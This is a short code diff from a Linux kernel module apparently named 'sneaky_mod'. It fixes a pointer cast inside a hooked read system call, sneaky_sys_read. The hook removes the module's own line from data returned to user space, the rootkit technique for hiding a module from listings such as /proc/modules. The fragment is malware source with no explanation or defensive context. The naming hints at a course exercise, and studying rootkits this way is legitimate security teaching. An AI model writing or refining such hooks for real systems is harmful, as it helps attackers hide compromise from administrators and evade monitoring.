@@ -102,7 +102,7 @@ asmlinkage long sneaky_sys_read(int fd, void *buf, size_t count) {
     printk(KERN_INFO "sneaky_mod\n");
     char* line_pos = strchr(sn_pos, '\n');
     size_t length = line_pos - sn_pos + 1;
-    memmove(sn_pos, line_pos + 1, value - (line_pos - buf + 1) );
+    memmove(sn_pos, line_pos + 1, value - (line_pos - (char*)buf + 1) );
     value -= length;
   }
   return value;
